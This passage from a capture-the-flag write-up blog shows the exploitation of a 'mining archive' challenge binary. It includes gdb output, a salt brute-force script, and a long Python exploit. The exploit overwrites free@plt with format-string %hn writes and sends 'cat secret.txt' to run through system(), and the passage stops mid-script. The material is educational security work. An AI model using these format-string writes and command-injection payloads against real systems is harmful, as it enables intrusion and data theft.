</span><span class='line'> <span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>___/
</span><span class='line'>
</span><span class='line'>          mining archive.
</span><span class='line'>
</span><span class='line'>Please give the unions slogan and secret word:
</span></code></pre></td></tr></table></div></figure>


<p>We have neither. Time to fire up the binary in <code>gdb</code>. I also uploaded it to <a href="http://decompiler.fit.vutbr.cz/decompilation/">the Retargetable Decompiler</a>. The binary looks for a file called <code>salt.txt</code>. I made a file with only <code>0</code> as contents. Using the output of the Retargetable Decompiler, I spotted the <code>strcmp</code> that checks the user-supplied password. It looks like it checks against <code>%,(!x4!%&lt;.&gt;</code>, but I figured that it does a bit of decoding. In <code>gdb</code>, I set a breakpoint on <code>strcmp</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p strcmp
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x8048660 &lt;strcmp@plt&gt;
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x8048660
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048660
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>...snip...
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xffffd44c --&gt; 0x80489c9 <span class="o">(</span><span class="nb">test   </span>eax,eax<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xffffd450 --&gt; 0xffffd497 <span class="o">(</span><span class="s2">&quot;BLEH&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xffffd454 --&gt; 0x804c818 <span class="o">(</span><span class="s2">&quot;gold&gt;silver0\n&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xffffd458 --&gt; 0xc <span class="o">(</span><span class="s1">&#39;\x0c&#39;</span><span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xffffd45c --&gt; 0xf7fbb000 --&gt; 0x1a6da8
</span><span class='line'>0020<span class="p">|</span> 0xffffd460 --&gt; 0x4
</span><span class='line'>0024<span class="p">|</span> 0xffffd464 --&gt; 0xb <span class="o">(</span><span class="s1">&#39;\x0b&#39;</span><span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xffffd468 --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048660 in strcmp@plt <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the slogan seems to be <code>gold&gt;silver</code>, and then the contents of <code>salt.txt</code> is appended. But how do we know what <code>salt.txt</code> contains on the remote server? I had another look at the output of the Decompiler, and this bit stuck out:</p>

<p><img src="http://barrebas.github.io/assets/hacklu-theunion/01.png" alt="" /></p>

<p>Only the first byte of <code>salt.txt</code> is used! This makes it easy to bruteforce it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;wildwildweb.fluxfingers.net&#39;</span><span class="p">,</span> <span class="mi">1423</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;gold&gt;silver&#39;</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This led us to finding that the full password is <code>gold&gt;silverb</code>. Nice! Next, we were presented with a menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to
</span><span class='line'> _   _                        _             _
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>__   ___   _   _ _ __ <span class="o">(</span>_<span class="o">)</span> ___  _ __ <span class="o">(</span> <span class="o">)</span>___
</span><span class='line'><span class="p">|</span> __<span class="p">|</span> <span class="s1">&#39;_ \ / _ \ | | | | &#39;</span>_ <span class="se">\|</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\|</span>// __<span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\</span>
</span><span class='line'> <span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>___/
</span><span class='line'>
</span><span class='line'>      mining archive.
</span><span class='line'>
</span><span class='line'>Please give the unions slogan and secret word:
</span><span class='line'>gold&gt;silverb
</span><span class='line'>Correct slogan.
</span><span class='line'>
</span><span class='line'>1<span class="o">)</span> Add mine
</span><span class='line'>2<span class="o">)</span> Show mines
</span><span class='line'>3<span class="o">)</span> Delete mine
</span><span class='line'>4<span class="o">)</span> Show profit
</span><span class='line'>5<span class="o">)</span> Exit
</span></code></pre></td></tr></table></div></figure>


<p>After poking around, I found a string format exploit in the <code>Add mine</code> and <code>Show profit</code> function. This little bit shows we have control over the format string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Do you want to see the profit?
</span><span class='line'>Location: %11<span class="nv">$x</span>-%12<span class="nv">$x</span>
</span><span class='line'>Type: AABBBBCCCC
</span><span class='line'>y/n
</span><span class='line'>y
</span><span class='line'>Profit <span class="k">for</span> location:
</span><span class='line'>42424242-43434343
</span><span class='line'>AABBBBCCCC
</span><span class='line'>666
</span></code></pre></td></tr></table></div></figure>


<p>We poked around the binary a bit more and Swappage identified the secret trapdoor function at <code>0x8049208</code>. It turns out that we could reach this function also when <code>99</code> is entered on the menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>99
</span><span class='line'>Ufff! You found our trapdoor.
</span><span class='line'>Ok here you go. Everything in here is not what it seems to be.
</span><span class='line'>If you <span class="k">do</span> not understand this, you are not quite there yet.
</span></code></pre></td></tr></table></div></figure>


<p>I wrote a small python script that exploits the string format bug so that it writes the address <code>0x8049208</code> to <code>free@plt</code>. Next, the script invokes <code>Delete mine</code> so that <code>free()</code> is called, but this actually points to the trapdoor function. When executing this script locally, I noticed that <code>/bin/sh</code> threw an error message, indicating that <code>system()</code> is called somehow. But upon examination of the binary, I could not find <em>any</em> calls to <code>system()</code>, <code>execve</code> or even <code>int 0x80</code>! What was going on here? <code>hopper</code> shed some light on this function:</p>

<p><img src="http://barrebas.github.io/assets/hacklu-theunion/02.png" alt="" /></p>

<p>There is a piece of code that is never actually executed when this trapdoor function is called from the menu, the <code>printf</code>. Oddly, the rest of the binary uses <code>puts</code>. I ran <code>gdb</code> and examined the pointer that is used and compare it to <code>printf</code>&hellip; It wasn&rsquo;t the same! On a hunch, I compared it to <code>system()</code>, which did match! So indeed, not everything is what it seems. With this in mind, we can modify the string format exploit. It should write the address of <code>printf@plt</code> to <code>free@plt</code>, so when a string is freed, <code>system()</code> is called with that string as argument. Command execution, here we come!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote server</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;wildwildweb.fluxfingers.net&#39;</span><span class="p">,</span> <span class="mi">1423</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive &amp; print banner</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send passphrase</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;gold&gt;silverb</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># delete all mines, makes it easier later</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add mine, supply a string format argument which</span>
</span><span class='line'><span class="c"># overwrites the first two bytes of free@plt pointer</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="c"># we need to write the value 0x85e0, which is 34272 </span>
</span><span class='line'><span class="c"># in decimal</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%34272c</span><span class="s">%11$hn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pointer to free@plt</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;AA</span><span class="se">\x14\xb0\x04\x08</span><span class="s">CCCC</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;666</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># invoke Show Profit &amp;&amp; trigger format string exploit</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive dummy bytes</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">342</span><span class="p">):</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add mine, supply a string format argument which</span>
</span><span class='line'><span class="c"># overwrites the last two bytes of free@plt pointer</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to write the value 0x0804, which is 2052 </span>
</span><span class='line'><span class="c"># in decimal</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%2052c</span><span class="s">%11$hn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c"># -&gt; 0x804 in hex</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pointer to free@plt+2</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;AA</span><span class="se">\x16\xb0\x04\x08</span><span class="s">CCCC</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;666</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># invoke Show Profit &amp;&amp; trigger format string exploit</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;n</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive extra bytes (from the string format exploit)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2400</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send payload, in another mine. we&#39;re going to delete it </span>
</span><span class='line'><span class="c"># right away to call system()</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell command goes here</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;cat secret.txt 2&amp;&gt;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># second command</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;bleh</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c">#0x804b02c</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># third command</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;blah</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
